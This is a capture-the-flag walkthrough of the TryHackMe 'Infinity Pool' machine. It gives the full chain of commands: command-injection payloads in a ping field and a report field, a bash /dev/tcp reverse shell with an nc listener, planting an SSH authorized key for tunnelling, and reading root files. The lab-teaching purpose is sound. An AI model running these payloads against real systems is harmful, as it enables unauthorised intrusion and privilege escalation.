# 9 — Infinity Pool

**Platform:** Tryhackme
**Category:** Boot2Root
**Difficulty:** Medium

---

## 1. Enumeration

I started with directory enumeration using Gobuster:

```bash
gobuster dir -u http://10.49.149.79 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,css,js,txt,xml
```

One of the interesting files I found was:

```text
/robots.txt
```

It contained:

```text
User-agent: *
Disallow: /internal/
Disallow: /status
```

Since `robots.txt` is not an access-control mechanism, I manually checked the interesting paths.

I also found `/internal/netcheck` referenced in the application's JavaScript.

---

## 2. Command Injection

I sent a request to:

```http
POST /internal/netcheck
```

with:

```text
host=127.0.0.1
```

The response showed that the application was executing a `ping` command.

I tested whether the parameter was injectable:

```text
127.0.0.1;ls
```

The response contained:

```text
app.py
requirements.txt
static
templates
venv
wsgi.py
```

This confirmed **OS command injection**.

### Getting a shell

I used the command injection to establish a reverse shell:

```text
127.0.0.1;bash -c 'bash -i >& /dev/tcp/192.168.135.65/4444 0>&1'
```

On my machine:

```bash
nc -lvnp 4444
```

The reverse shell connected successfully.

---

## 3. Getting the User Flag

Once I had a shell, I searched for the user flag:

```bash
find / -type f -name user.txt 2>/dev/null
```

This returned:

```text
/home/web/user.txt
```

I read it with:

```bash
cat /home/web/user.txt
```

This gave me the **user flag**.

At this point, I started looking for a privilege-escalation path.

---

## 4. Enumerating Internal Services

While enumerating running processes, I noticed another service running as a different user:

```bash
ps auxww | grep watchtower
```

The interesting processes were:

```text
svc-watchtower ... /var/www/infinity_pool/watchtower/venv/bin/python3
/var/www/infinity_pool/watchtower/venv/bin/gunicorn
--workers 1
--bind 127.0.0.1:3000
wsgi:app
```

The important observation was:

```text
127.0.0.1:3000
```

The service was only listening locally, so it wasn't directly accessible from my machine.

However, I already had a shell on the target, so I tested it locally:

```bash
curl http://127.0.0.1:3000/api/config
```

This returned configuration information including:

```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "note": "internal network only - do not expose",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "............",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}
```

This gave me credentials for the internal **FreePBX UCP** service.

---

## 5. Accessing FreePBX UCP

The FreePBX service was also bound to localhost:

```text
127.0.0.1:8080
```

So I needed to tunnel the port through SSH.

First, I generated an SSH key:

```bash
ssh-keygen -t rsa -b 2048 -f ./infinite_key -N ""
```

Then I encoded the public key:

```bash
base64 -w0 infinite_key.pub
```

I added the public key to the `web` user's authorized keys:

```bash
mkdir -p /home/web/.ssh
echo 'BASE64_STRING' | base64 -d > /home/web/.ssh/authorized_keys
chmod 700 /home/web/.ssh
chmod 600 /home/web/.ssh/authorized_keys
```

I could then create the SSH tunnel:

```bash
ssh -i infinite_key -L 8080:127.0.0.1:8080 web@<TARGET_IP>
```

Now the target's internal port 8080 was available through:

```text
http://127.0.0.1:8080/ucp/
```

I opened the FreePBX User Control Panel and logged in using the credentials obtained from `/api/config`.

---

## 6. Finding the Automation Key

The FreePBX dashboard initially appeared mostly empty.

I created a dashboard and explored the available widgets.

Under the voicemail-related widgets, I found:

```text
FreePBXUCPTemplateCreator
```

Adding the widget exposed a voicemail entry.

The caller ID on that entry contained an **Automation Key**.

This was an important clue because the earlier `/api/config` response had revealed:

```text
automation_endpoint: http://127.0.0.1:9000
```

So I now had both:

- The Automation service
- The authentication key required to access it

---

## 7. Enumerating the Automation Service

Back on the target, I checked the service:

```bash
curl -s http://127.0.0.1:9000/health
```

The response was extremely useful.

It documented an authenticated endpoint:

```json
{
  "endpoints": {
    "GET /health": "service status",
    "POST /jobs/export": {
      "auth": "Authorization: Bearer <automation key>",
      "body": {
        "report": "<report name>"
      },
      "desc": "archive the latest data export"
    }
  },
  "runs_as": "root",
  "service": "automation",
  "status": "ok"
}
```

The most important piece was:

```text
"runs_as": "root"
```

The service was running with **root privileges**.

---

## 8. Command Injection in `/jobs/export`

I first sent a normal request:

```bash
KEY='AUTOMATION_KEY'

curl -s -X POST -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" http://127.0.0.1:9000/jobs/export -d '{"report":"test"}'
```

The response showed the command constructed by the application:

```text
tar czf /var/automation/exports/test.tgz /var/automation/data
```

This immediately stood out.

The user-controlled `report` value was being inserted directly into a shell command without proper quoting or validation.

Conceptually, the application was doing something like:

```text
tar czf /var/automation/exports/<USER INPUT>.tgz /var/automation/data
```

Therefore, shell metacharacters could alter the command.

---

## 9. Command Injection as Root

I tested command injection by manipulating the `report` parameter.

For example:

```bash
curl -s -X POST -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" http://127.0.0.1:9000/jobs/export -d '{"report":"test; cat /root/root.txt;"}'
```

The resulting command became:

```text
tar czf /var/automation/exports/test; cat /root/root.txt;.tgz /var/automation/data
```

The API response contained the output from the injected command:

```text
root flag
/bin/sh: 1: .tgz: not found
tar: Cowardly refusing to create an empty archive
```

The important part was:

```text
root flag
```

The command was executed by the root-owned automation service, giving me **root-level command execution**.

This completed the privilege escalation and I obtained the root flag.

---

## 10. Exploitation Chain

The challenge was essentially a chain of trust between several internal components:

```text
                 Web Application
                        |
                        v
              /internal/netcheck
                        |
                 Command Injection
                        |
                        v
                 Reverse Shell
                   (web user)
                        |
                        v
               Watchtower :3000
                        |
                   /api/config
                        |
                        v
                FreePBX Credentials
                        |
                        v
                SSH Port Forwarding
                        |
                        v
                 FreePBX UCP :8080
                        |
                  Voicemail Widget
                        |
                        v
                 Automation Key
                        |
                        v
              Automation Service :9000
                        |
                    /jobs/export
                        |
                 Command Injection
                        |
                        v
                   Root Execution
                        |
                        v
                    root.txt
```

---

## 11. Key Vulnerabilities

### Command Injection — `/internal/netcheck`

The `host` parameter was passed into a system command without proper validation.

```text
host=127.0.0.1;ls
```

This resulted in arbitrary command execution.

### Sensitive Information Disclosure — Watchtower

The internal Watchtower API exposed:

- FreePBX username
- FreePBX password
- Internal service locations
- Automation endpoint information

through:

```text
/api/config
```

### Default Credentials — FreePBX

The configuration indicated that the FreePBX UCP account was still using template credentials:

```text
FreePBXUCPTemplateCreator
```

This allowed access to the internal UCP service.

### Sensitive Secret in Voicemail

The FreePBX interface exposed the Automation Key through a voicemail entry.

This demonstrates why secrets should not be placed in user-accessible application data.

### Root-Level Command Injection — Automation

The automation service constructed a shell command using the attacker-controlled `report` value:

```text
tar czf /var/automation/exports/<report>.tgz ...
```

Because the service ran as:

```text
root
```

the command injection resulted in root-level code execution.

---

## 12. Final Takeaways

The most important lesson from this machine was **not to stop after obtaining the first shell**.

The initial command injection only gave me access as the `web` user. The actual privilege escalation required following the internal trust relationships:

> **Web → Watchtower → FreePBX → Automation → Root**

The services listening on `127.0.0.1` weren't inaccessible after obtaining a shell on the target. They became valuable attack surfaces for internal enumeration.

The biggest clues were:

```text
127.0.0.1:3000
127.0.0.1:8080
127.0.0.1:9000
```

and especially:

```text
"runs_as": "root"
```

in the Automation service.

### Complete Attack Chain

```text
Directory Enumeration
        ↓
/internal/netcheck
        ↓
OS Command Injection
        ↓
Reverse Shell
        ↓
Watchtower API
        ↓
FreePBX Credentials
        ↓
SSH Tunneling
        ↓
FreePBX UCP
        ↓
Automation Key
        ↓
/jobs/export
        ↓
Command Injection
        ↓
Root
```

This was a good example of how **multiple individually small security mistakes can be chained together into complete system compromise**.